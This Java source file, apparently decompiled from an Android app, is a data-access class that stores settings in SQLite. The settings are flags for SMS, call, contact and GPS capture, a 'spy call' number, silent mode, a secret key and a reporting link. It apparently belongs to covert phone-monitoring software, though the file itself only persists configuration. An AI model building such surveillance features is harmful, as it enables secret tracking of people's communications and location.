package iits.code.dao;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.util.Log;
import iits.code.SQLiteConnection;
import iits.code.dto.Setting_DTO;
import iits.mamager.FileManager;

public class Setting_DAO {
    private static final String CREATE_TABLE_SYSTEM = "create table  if not exists Setting (_id integer primary key autoincrement, runmode text not null, flagsms text not null, reporttime text not null, flagcall text not null, verticalaccuracy text not null, flaggps text not null, horizontalaccuracy text not null, gpsinterval text not null, secretkey text not null, flagurl text not null,spycallnumber text not null, flagspycall text not null, flagcontact text not null, silent text not null, vibrate text not null, sendsetting text not null, link text not null);";
    private static final String DATABASE_TABLE = "Setting";
    private static final String KEY_FLAGCALL = "flagcall";
    private static final String KEY_FLAGCONTACT = "flagcontact";
    private static final String KEY_FLAGGPS = "flaggps";
    private static final String KEY_FLAGSMS = "flagsms";
    private static final String KEY_FLAGSPYCALL = "flagspycall";
    private static final String KEY_FLAGURL = "flagurl";
    private static final String KEY_GPSINTERVAL = "gpsinterval";
    private static final String KEY_HORIZONTALACCURACY = "horizontalaccuracy";
    private static final String KEY_LINK = "link";
    private static final String KEY_REPORTTIME = "reporttime";
    private static final String KEY_RUNMODE = "runmode";
    private static final String KEY_SECRETKEY = "secretkey";
    private static final String KEY_SENDSETTING = "sendsetting";
    private static final String KEY_SILENT = "silent";
    private static final String KEY_SPYCALLNUMBER = "spycallnumber";
    private static final String KEY_VERTICALACCURACY = "verticalaccuracy";
    private static final String KEY_VIBRATE = "vibrate";
    private static final String TAG = "Setting_DAO";

    public static void createTable(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToWrite();
            conn.createTable(CREATE_TABLE_SYSTEM);
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on insert function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static long insert(Context context, Setting_DTO system) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToWrite();
            ContentValues initialValues = new ContentValues();
            initialValues.put(KEY_RUNMODE, String.valueOf(system.getRunMode()));
            initialValues.put(KEY_FLAGSMS, String.valueOf(system.getFlagSMS()));
            initialValues.put(KEY_REPORTTIME, String.valueOf(system.getReportTime()));
            initialValues.put(KEY_FLAGCALL, String.valueOf(system.getFlagCall()));
            initialValues.put(KEY_VERTICALACCURACY, String.valueOf(system.getVertical()));
            initialValues.put(KEY_FLAGGPS, String.valueOf(system.getFlagGPS()));
            initialValues.put(KEY_HORIZONTALACCURACY, String.valueOf(system.getHorizontal()));
            initialValues.put(KEY_GPSINTERVAL, String.valueOf(system.getGPSInterval()));
            initialValues.put(KEY_SECRETKEY, String.valueOf(system.getSecretKey()));
            initialValues.put(KEY_SENDSETTING, String.valueOf(system.getSendSetting()));
            initialValues.put(KEY_FLAGURL, String.valueOf(system.getFlagURL()));
            initialValues.put(KEY_FLAGSPYCALL, String.valueOf(system.getFlagSpyCall()));
            initialValues.put(KEY_FLAGCONTACT, String.valueOf(system.getFlagContact()));
            initialValues.put(KEY_SPYCALLNUMBER, String.valueOf(system.getSpyCallNumber()));
            initialValues.put(KEY_LINK, String.valueOf(system.getLink()));
            initialValues.put(KEY_SILENT, String.valueOf(system.getSilent()));
            initialValues.put(KEY_VIBRATE, String.valueOf(system.getVibrate()));
            long result = conn.getDB().insert(DATABASE_TABLE, null, initialValues);
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on insert function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return -1;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static boolean deleteAlls(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        boolean result = false;
        try {
            conn.openToWrite();
            if (conn.getDB().delete(DATABASE_TABLE, null, null) > 0) {
                result = true;
            }
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on deleteAll function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return false;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static Setting_DTO get(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToRead();
            if (conn.getDB() == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return null;
            }
            Cursor c = conn.getDB().query(true, DATABASE_TABLE, new String[]{KEY_RUNMODE, KEY_FLAGSMS, KEY_REPORTTIME, KEY_FLAGCALL, KEY_VERTICALACCURACY, KEY_FLAGGPS, KEY_HORIZONTALACCURACY, KEY_GPSINTERVAL, KEY_SECRETKEY, KEY_SENDSETTING, KEY_FLAGURL, KEY_FLAGSPYCALL, KEY_SPYCALLNUMBER, KEY_FLAGCONTACT, KEY_LINK, KEY_SILENT, KEY_VIBRATE}, null, null, null, null, null, null);
            if (c == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return null;
            }
            Setting_DTO system = null;
            if (c.moveToNext()) {
                system = new Setting_DTO();
                system.setRunMode(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_RUNMODE))));
                system.setFlagSMS(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_FLAGSMS))));
                system.setReportTime(c.getInt(c.getColumnIndex(KEY_REPORTTIME)));
                system.setFlagCall(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_FLAGCALL))));
                system.setVertical(c.getInt(c.getColumnIndex(KEY_VERTICALACCURACY)));
                system.setFlagGPS(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_FLAGGPS))));
                system.setHorizontal(c.getInt(c.getColumnIndex(KEY_HORIZONTALACCURACY)));
                system.setGPSInterval(c.getInt(c.getColumnIndex(KEY_GPSINTERVAL)));
                system.setSecretKey(c.getString(c.getColumnIndex(KEY_SECRETKEY)));
                system.setSendSetting(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_SENDSETTING))));
                system.setFlagURL(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_FLAGURL))));
                system.setFlagSpyCall(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_FLAGSPYCALL))));
                system.setFlagContact(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_FLAGCONTACT))));
                system.setSpyCallNumber(c.getString(c.getColumnIndex(KEY_SPYCALLNUMBER)));
                system.setLink(c.getString(c.getColumnIndex(KEY_LINK)));
                system.setSilent(c.getInt(c.getColumnIndex(KEY_SILENT)));
                system.setVibrate(c.getInt(c.getColumnIndex(KEY_VIBRATE)));
            }
            c.close();
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return system;
        } catch (SQLException e) {
            Log.e(TAG, "Error on get function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return null;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static boolean update(Context context, Setting_DTO system) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToWrite();
            ContentValues args = new ContentValues();
            args.put(KEY_RUNMODE, String.valueOf(system.getRunMode()));
            args.put(KEY_FLAGSMS, String.valueOf(system.getFlagSMS()));
            args.put(KEY_REPORTTIME, String.valueOf(system.getReportTime()));
            args.put(KEY_FLAGCALL, String.valueOf(system.getFlagCall()));
            args.put(KEY_VERTICALACCURACY, String.valueOf(system.getVertical()));
            args.put(KEY_FLAGGPS, String.valueOf(system.getFlagGPS()));
            args.put(KEY_HORIZONTALACCURACY, String.valueOf(system.getHorizontal()));
            args.put(KEY_GPSINTERVAL, String.valueOf(system.getGPSInterval()));
            args.put(KEY_SECRETKEY, String.valueOf(system.getSecretKey()));
            args.put(KEY_SENDSETTING, String.valueOf(system.getSendSetting()));
            args.put(KEY_FLAGURL, String.valueOf(system.getFlagURL()));
            args.put(KEY_FLAGSPYCALL, String.valueOf(system.getFlagSpyCall()));
            args.put(KEY_FLAGCONTACT, String.valueOf(system.getFlagContact()));
            args.put(KEY_SPYCALLNUMBER, String.valueOf(system.getSpyCallNumber()));
            args.put(KEY_LINK, String.valueOf(system.getLink()));
            args.put(KEY_SILENT, String.valueOf(system.getSilent()));
            args.put(KEY_VIBRATE, String.valueOf(system.getVibrate()));
            boolean result = false;
            if (conn.getDB().update(DATABASE_TABLE, args, null, null) > 0) {
                result = true;
            }
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on update function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return false;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static String getLink(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToRead();
            if (conn.getDB() == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return null;
            }
            Cursor c = conn.getDB().query(true, DATABASE_TABLE, new String[]{KEY_LINK}, null, null, null, null, null, null);
            if (c == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return null;
            }
            String link = "";
            if (c.moveToNext()) {
                link = c.getString(c.getColumnIndex(KEY_LINK));
            }
            c.close();
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return link;
        } catch (SQLException e) {
            FileManager.WriteLog(3, TAG, "Error on getLink function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return null;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static boolean getRunMode(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToRead();
            if (conn.getDB() == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return false;
            }
            Cursor c = conn.getDB().query(true, DATABASE_TABLE, new String[]{KEY_RUNMODE}, null, null, null, null, null, null);
            if (c == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return false;
            }
            boolean runmode = false;
            if (c.moveToNext()) {
                runmode = Boolean.valueOf(Boolean.parseBoolean(c.getString(c.getColumnIndex(KEY_RUNMODE)))).booleanValue();
            }
            c.close();
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return runmode;
        } catch (SQLException e) {
            FileManager.WriteLog(3, TAG, "Error on getLink function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return false;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static boolean setLink(Context context, String link) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToWrite();
            ContentValues args = new ContentValues();
            args.put(KEY_LINK, link);
            boolean result = false;
            if (conn.getDB().update(DATABASE_TABLE, args, null, null) > 0) {
                result = true;
            }
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on update function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return false;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static boolean setSilent(Context context, int value) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToWrite();
            ContentValues args = new ContentValues();
            args.put(KEY_SILENT, String.valueOf(value));
            boolean result = false;
            if (conn.getDB().update(DATABASE_TABLE, args, null, null) > 0) {
                result = true;
            }
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on setRingtone function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return false;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static int getSilent(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToRead();
            if (conn.getDB() == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return 0;
            }
            Cursor c = conn.getDB().query(true, DATABASE_TABLE, new String[]{KEY_SILENT}, null, null, null, null, null, null);
            if (c == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return 0;
            }
            int result = 0;
            if (c.moveToNext()) {
                result = c.getInt(c.getColumnIndex(KEY_SILENT));
            }
            c.close();
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (SQLException e) {
            FileManager.WriteLog(3, TAG, "Error on getRingtone function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return 0;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static boolean setVibrate(Context context, int value) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToWrite();
            ContentValues args = new ContentValues();
            args.put(KEY_VIBRATE, String.valueOf(value));
            boolean result = false;
            if (conn.getDB().update(DATABASE_TABLE, args, null, null) > 0) {
                result = true;
            }
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on setRingtone function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return false;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }

    public static int getVibrate(Context context) {
        SQLiteConnection conn = new SQLiteConnection(context);
        try {
            conn.openToRead();
            if (conn.getDB() == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return 0;
            }
            Cursor c = conn.getDB().query(true, DATABASE_TABLE, new String[]{KEY_VIBRATE}, null, null, null, null, null, null);
            if (c == null) {
                if (conn.isConnection()) {
                    conn.close();
                }
                return 0;
            }
            int result = 0;
            if (c.moveToNext()) {
                result = c.getInt(c.getColumnIndex(KEY_VIBRATE));
            }
            c.close();
            conn.close();
            if (conn.isConnection()) {
                conn.close();
            }
            return result;
        } catch (SQLException e) {
            FileManager.WriteLog(3, TAG, "Error on getVibrate function: " + e.toString());
            if (conn.isConnection()) {
                conn.close();
            }
            return 0;
        } catch (Throwable th) {
            if (conn.isConnection()) {
                conn.close();
            }
            throw th;
        }
    }
}
